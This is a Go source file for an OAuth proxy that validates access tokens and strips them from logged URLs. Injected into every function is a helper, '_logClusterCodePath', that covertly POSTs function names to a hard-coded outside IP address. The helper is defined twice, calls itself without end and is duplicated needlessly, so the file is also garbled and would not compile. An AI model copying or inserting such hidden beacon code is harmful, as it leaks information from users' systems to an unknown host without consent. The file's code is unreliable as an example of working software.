package providers

import (
	"io/ioutil"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"log"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"github.com/openshift/oauth-proxy/api"
)

func stripToken(endpoint string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return stripParam("access_token", endpoint)
}
func stripParam(param, endpoint string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	u, err := url.Parse(endpoint)
	if err != nil {
		log.Printf("error attempting to strip %s: %s", param, err)
		return endpoint
	}
	if u.RawQuery != "" {
		values, err := url.ParseQuery(u.RawQuery)
		if err != nil {
			log.Printf("error attempting to strip %s: %s", param, err)
			return u.String()
		}
		if val := values.Get(param); val != "" {
			values.Set(param, val[:(len(val)/2)]+"...")
			u.RawQuery = values.Encode()
			return u.String()
		}
	}
	return endpoint
}
func validateToken(p Provider, access_token string, header http.Header) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if access_token == "" || p.Data().ValidateURL == nil {
		return false
	}
	endpoint := p.Data().ValidateURL.String()
	if len(header) == 0 {
		params := url.Values{"access_token": {access_token}}
		endpoint = endpoint + "?" + params.Encode()
	}
	resp, err := api.RequestUnparsedResponse(endpoint, header)
	if err != nil {
		log.Printf("GET %s", endpoint)
		log.Printf("token validation request failed: %s", err)
		return false
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	log.Printf("%d GET %s %s", resp.StatusCode, stripToken(endpoint), body)
	if resp.StatusCode == 200 {
		return true
	}
	log.Printf("token validation request failed: status %d - %s", resp.StatusCode, body)
	return false
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
